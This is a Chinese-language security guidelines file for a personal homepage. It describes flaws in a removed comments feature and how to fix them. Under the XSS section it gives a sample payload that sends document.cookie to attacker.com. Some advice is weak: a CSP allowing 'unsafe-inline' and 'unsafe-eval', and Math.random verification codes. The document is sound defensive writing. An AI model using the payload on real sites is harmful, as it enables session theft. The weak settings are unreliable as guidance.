# Security Guidelines for Fisher老师 Homepage

本文档记录了在实现新功能时的安全最佳实践，特别是涉及用户输入和数据处理的功能。

## 已移除的 Comments 功能的安全问题

原 Comments 组件存在以下严重安全漏洞（已在 2025年移除）：

### 1. XSS（跨站脚本攻击）- 严重风险 ⚠️

**问题**：
- 用户输入直接显示，无任何过滤或转义
- 攻击者可注入恶意 JavaScript 代码
- 可能窃取用户 cookie、session token 或执行任意操作

**示例攻击**：
```javascript
// 攻击者可在留言中注入：
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**解决方案（如重新实现）**：
```typescript
import DOMPurify from 'isomorphic-dompurify';

// 清理用户输入
const sanitizedContent = DOMPurify.sanitize(formData.content, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
  ALLOWED_ATTR: []
});
```

### 2. 无速率限制 - 拒绝服务风险 ⚠️

**问题**：
- 用户可无限提交留言
- 易受垃圾评论和自动化攻击
- 可耗尽浏览器 localStorage 空间

**解决方案（如重新实现）**：

前端限制（基础）：
```typescript
// 使用 localStorage 记录提交时间
const canSubmit = () => {
  const lastSubmit = localStorage.getItem('lastCommentTime');
  const now = Date.now();

  if (lastSubmit && now - parseInt(lastSubmit) < 60000) {
    return false; // 1分钟内只能提交一次
  }

  localStorage.setItem('lastCommentTime', now.toString());
  return true;
};
```

后端限制（推荐）：
```typescript
// 使用 Redis 或内存存储实现 IP 限制
const rateLimit = new Map<string, number[]>();

const checkRateLimit = (ip: string): boolean => {
  const now = Date.now();
  const requests = rateLimit.get(ip) || [];

  // 移除1小时前的记录
  const recent = requests.filter(t => now - t < 3600000);

  if (recent.length >= 10) {
    return false; // 1小时内最多10条
  }

  recent.push(now);
  rateLimit.set(ip, recent);
  return true;
};
```

### 3. 无身份认证 - 冒充风险 ⚠️

**问题**：
- 任何人可冒充他人身份
- 无用户身份验证机制
- 无法防止恶意用户冒充

**解决方案（如重新实现）**：

选项 A - reCAPTCHA v3（推荐）：
```typescript
import { GoogleReCaptchaProvider } from 'react-google-recaptcha-v3';

// 在组件中验证
const onVerify = useCallback(async (token: string) => {
  const response = await fetch('/api/verify-captcha', {
    method: 'POST',
    body: JSON.stringify({ token })
  });

  const result = await response.json();
  if (result.score < 0.5) {
    // 可能是机器人，拒绝提交
  }
}, []);
```

选项 B - 邮箱验证：
```typescript
// 发送验证码到用户邮箱
const sendVerificationCode = async (email: string) => {
  const code = Math.random().toString(36).substring(7);
  // 存储到 Redis，5分钟过期
  await redis.setex(`verify:${email}`, 300, code);

  await sendEmail({
    to: email,
    subject: '验证码',
    body: `您的验证码是: ${code}`
  });
};
```

### 4. 仅客户端存储 - 数据完整性风险 ⚠️

**问题**：
- 使用 localStorage（仅限浏览器本地）
- 数据可被用户轻易篡改
- 跨设备无法同步
- 清除浏览器数据会丢失所有留言

**解决方案（如重新实现）**：

迁移到数据库：
```typescript
// 使用 Next.js API Routes + 数据库（如 PostgreSQL, MongoDB）
export async function POST(req: Request) {
  const { name, content, email } = await req.json();

  // 验证和清理输入
  const sanitized = sanitizeInput({ name, content, email });

  // 存储到数据库
  const comment = await db.comments.create({
    data: {
      ...sanitized,
      createdAt: new Date(),
      ip: req.headers.get('x-forwarded-for') || 'unknown'
    }
  });

  return Response.json(comment);
}
```

### 5. 输入验证不足 - 注入风险 ⚠️

**问题**：
- 邮箱格式无验证
- 无内容长度上限
- 无特殊字符过滤
- 无敏感词过滤

**解决方案（如重新实现）**：

```typescript
import { z } from 'zod';

// 定义验证模式
const CommentSchema = z.object({
  name: z.string()
    .min(2, '姓名至少2个字符')
    .max(50, '姓名最多50个字符')
    .regex(/^[\u4e00-\u9fa5a-zA-Z\s]+$/, '姓名只能包含中英文'),

  email: z.string()
    .email('邮箱格式不正确')
    .optional(),

  content: z.string()
    .min(10, '留言内容至少10个字符')
    .max(1000, '留言内容最多1000个字符')
    .refine(content => {
      // 检查敏感词
      const forbiddenWords = ['垃圾', '诈骗', '违禁词'];
      return !forbiddenWords.some(word => content.includes(word));
    }, '留言包含不当内容')
});

// 使用验证
const result = CommentSchema.safeParse(formData);
if (!result.success) {
  return { error: result.error.errors };
}
```

## 实现新功能的安全检查清单

如果将来需要添加用户交互功能，请确保：

### ✅ 前端安全

- [ ] **输入净化**：使用 DOMPurify 或类似库清理所有用户输入
- [ ] **输出转义**：React 默认转义，但需确保不使用 `dangerouslySetInnerHTML`
- [ ] **内容安全策略（CSP）**：添加 CSP headers 防止 XSS
- [ ] **表单验证**：客户端验证 + 服务端验证（双重验证）
- [ ] **CSRF 保护**：使用 CSRF tokens
- [ ] **速率限制**：前端 + 后端双重限制

### ✅ 后端安全（如添加后端）

- [ ] **输入验证**：使用 Zod 或 Joi 验证所有输入
- [ ] **参数化查询**：防止 SQL 注入
- [ ] **最小权限原则**：数据库用户仅授予必要权限
- [ ] **日志记录**：记录所有可疑活动
- [ ] **错误处理**：不向用户暴露敏感信息
- [ ] **依赖更新**：定期更新依赖包

### ✅ 数据安全

- [ ] **HTTPS only**：仅通过 HTTPS 传输数据
- [ ] **加密存储**：敏感数据（如邮箱）加密存储
- [ ] **备份策略**：定期备份数据库
- [ ] **数据保留**：明确数据保留政策
- [ ] **GDPR 合规**：如服务欧盟用户，需符合 GDPR

### ✅ 身份认证和授权

- [ ] **强密码策略**：如需用户账号
- [ ] **多因素认证**：可选 MFA
- [ ] **会话管理**：安全的 token 管理（JWT）
- [ ] **权限控制**：用户只能访问自己的数据

## 推荐的安全工具和库

### TypeScript/Next.js

```bash
# 输入净化
npm install isomorphic-dompurify

# 输入验证
npm install zod

# 邮箱验证
npm install nodemailer

# CAPTCHA
npm install react-google-recaptcha-v3

# 速率限制（如使用 API Routes）
npm install [upstash/ratelimit](https://github.com/upstash/ratelimit)
```

### 安全 Headers

在 `next.config.js` 中添加：

```javascript
const nextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
          {
            key: 'Permissions-Policy',
            value: 'camera=(), microphone=(), geolocation=()',
          },
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';"
          },
        ],
      },
    ];
  },
};
```

## 替代方案：第三方服务

如果将来需要留言/评论功能，建议使用成熟的第三方服务：

### 1. Disqus
- ✅ 成熟稳定
- ✅ 自动处理垃圾评论
- ⚠️ 可能显示广告
- ⚠️ 隐私政策需评估

### 2. Remark42
- ✅ 开源自托管
- ✅ 支持多种认证方式
- ✅ 轻量级
- ⚠️ 需要自己部署

### 3. Giscus
- ✅ 基于 GitHub Discussions
- ✅ 免费且开源
- ✅ 无需数据库
- ⚠️ 用户需要 GitHub 账号

### 4. StaticMan
- ✅ 专为静态网站设计
- ✅ 评论存储为 GitHub issues
- ✅ 无需后端
- ⚠️ 依赖 GitHub API

## 联系和支持

如有安全相关问题或发现漏洞，请通过以下方式联系：

- **邮箱**：通过网站上的 WeChat 二维码联系
- **GitHub Issues**：[提交问题](https://github.com/fisheryadd-prog/yuzeng-homepage/issues)

## 参考资源

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Next.js Security Best Practices](https://nextjs.org/docs/app/building-your-application/configuring/security)
- [Web Security Academy](https://portswigger.net/web-security)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---

**最后更新**：2025年
**版本**：1.0
**维护者**：Fisher老师开发团队
